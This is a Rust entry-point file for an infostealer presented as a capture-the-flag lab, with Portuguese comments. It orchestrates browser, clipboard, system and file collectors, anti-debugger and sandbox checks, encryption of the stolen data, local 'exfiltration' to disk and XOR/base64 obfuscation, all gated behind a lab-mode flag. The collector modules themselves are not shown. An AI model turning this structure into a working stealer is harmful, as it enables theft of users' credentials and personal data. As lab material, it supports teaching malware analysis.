//! MyStealer CTF Lab - Educational Infostealer
//!
//! ⚠️ AVISO: Este software é APENAS para fins educacionais.
//! Uso indevido é ILEGAL e pode resultar em consequências criminais.

use clap::Parser;
use tracing::{info, warn, error, Level};
use tracing_subscriber::FmtSubscriber;

mod config;
mod collectors;
mod crypto;
mod exfil;
mod utils;

use config::Config;
use utils::anti_analysis::EnvironmentChecker;
use utils::helpers::format_size;

/// MyStealer CTF Lab - Educational Infostealer
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Executar em modo laboratório (obrigatório para segurança)
    #[arg(long, default_value_t = true)]
    lab_mode: bool,

    /// Nível de logging (trace, debug, info, warn, error)
    #[arg(short, long, default_value = "info")]
    log_level: String,

    /// Diretório de saída para dados coletados
    #[arg(short, long, default_value = "./output")]
    output_dir: String,

    /// Módulos a executar (separados por vírgula)
    #[arg(short, long, default_value = "system,browser,clipboard,files")]
    modules: String,

    /// Pular verificações de ambiente (PERIGOSO)
    #[arg(long, default_value_t = false)]
    skip_checks: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    // Configurar logging
    let log_level = match args.log_level.to_lowercase().as_str() {
        "trace" => Level::TRACE,
        "debug" => Level::DEBUG,
        "info" => Level::INFO,
        "warn" => Level::WARN,
        "error" => Level::ERROR,
        _ => Level::INFO,
    };

    let subscriber = FmtSubscriber::builder()
        .with_max_level(log_level)
        .with_target(false)
        .with_thread_ids(false)
        .with_file(false)
        .with_line_number(false)
        .finish();

    tracing::subscriber::set_global_default(subscriber)
        .expect("Falha ao configurar logging");

    // Banner
    print_banner();

    // Verificar modo lab
    #[cfg(feature = "lab-mode")]
    {
        info!("[*] Lab mode ACTIVE");
        
        if !args.skip_checks {
            info!("[*] Checking environment...");
            
            // Anti-analysis checks
            if EnvironmentChecker::is_debugger_present() {
                warn!("[!] Debugger detected");
            }
            
            if EnvironmentChecker::is_sandbox() {
                warn!("[!] Sandbox indicators found");
            }
            
            if EnvironmentChecker::timing_check() {
                warn!("[!] Timing anomaly detected");
            }
            
            match EnvironmentChecker::verify_lab_environment() {
                Ok(true) => {
                    info!("[+] Lab environment verified");
                }
                Ok(false) => {
                    error!("[-] Not a lab environment!");
                    error!("[-] Run this ONLY in isolated VMs.");
                    error!("[-] Use --skip-checks to bypass (DANGEROUS!)");
                    std::process::exit(1);
                }
                Err(e) => {
                    warn!("[?] Could not verify environment: {}", e);
                }
            }
        } else {
            warn!("[!] Security checks DISABLED!");
            warn!("[!] You're on your own!");
        }
    }

    #[cfg(not(feature = "lab-mode"))]
    {
        error!("❌ ERRO: Compilado sem modo laboratório!");
        error!("Recompile com: cargo build --features lab-mode");
        std::process::exit(1);
    }

    // Carregar configuração
    let config = Config::new(
        args.output_dir.clone(),
        args.modules.split(',').map(|s| s.trim().to_string()).collect(),
    );

    info!("Configuração carregada:");
    info!("  Output: {}", config.output_dir);
    info!("  Módulos: {:?}", config.enabled_modules);

    // Executar coleta
    info!("Iniciando coleta de dados...");
    
    let result = run_collection(&config).await;

    match result {
        Ok(data_path) => {
            info!("✅ Coleta concluída com sucesso!");
            info!("📁 Dados salvos em: {}", data_path);
        }
        Err(e) => {
            error!("❌ Erro durante coleta: {}", e);
            return Err(e);
        }
    }

    info!("MyStealer CTF Lab finalizado.");
    Ok(())
}

fn print_banner() {
    println!(r#"
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ███╗   ███╗██╗   ██╗███████╗████████╗███████╗ █████╗ ██╗   ║
    ║   ████╗ ████║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║   ║
    ║   ██╔████╔██║ ╚████╔╝ ███████╗   ██║   █████╗  ███████║██║   ║
    ║   ██║╚██╔╝██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██╔══██║██║   ║
    ║   ██║ ╚═╝ ██║   ██║   ███████║   ██║   ███████╗██║  ██║███████╗
    ║   ╚═╝     ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
    ║                                                              ║
    ║                    CTF LAB - Educational Only                ║
    ║                                                              ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  ⚠️  AVISO: Apenas para fins educacionais em labs isolados   ║
    ╚══════════════════════════════════════════════════════════════╝
    "#);
}

async fn run_collection(config: &Config) -> anyhow::Result<String> {
    use collectors::CollectorManager;
    use crypto::{CryptoManager, obfuscation};
    use exfil::LocalExfiltrator;

    std::fs::create_dir_all(&config.output_dir)?;

    let mut manager = CollectorManager::new();
    
    for module in &config.enabled_modules {
        manager.register_module(module)?;
    }

    info!("[*] Running {} collectors...", manager.collector_count());
    let collected_data = manager.run_all().await?;

    info!("[*] Encrypting collected data...");
    let crypto = CryptoManager::new()?;
    let json_bytes = serde_json::to_vec(&collected_data)?;
    let encrypted = crypto.encrypt(&json_bytes)?;
    
    info!("[*] Data size: {} -> {} (encrypted)", 
        format_size(json_bytes.len() as u64),
        format_size(encrypted.len() as u64));

    let exfil = LocalExfiltrator::new(&config.output_dir);
    let output_path = exfil.save(&encrypted)?;

    #[cfg(feature = "lab-mode")]
    {
        // Readable JSON for analysis
        let readable_path = format!("{}/collected_data_readable.json", config.output_dir);
        std::fs::write(&readable_path, serde_json::to_string_pretty(&collected_data)?)?;
        info!("[+] Readable version: {}", readable_path);
        
        // Demo XOR obfuscation
        let key = b"labkey123";
        let test_data = b"sensitive_string";
        let encoded = obfuscation::xor_encode(test_data, key);
        let decoded = obfuscation::xor_decode(&encoded, key);
        assert_eq!(test_data.as_slice(), decoded.as_slice());
        
        // Demo base64
        let b64 = obfuscation::b64_encode(&encrypted[..32.min(encrypted.len())]);
        info!("[*] B64 sample: {}...", &b64[..32.min(b64.len())]);
    }

    Ok(output_path)
}

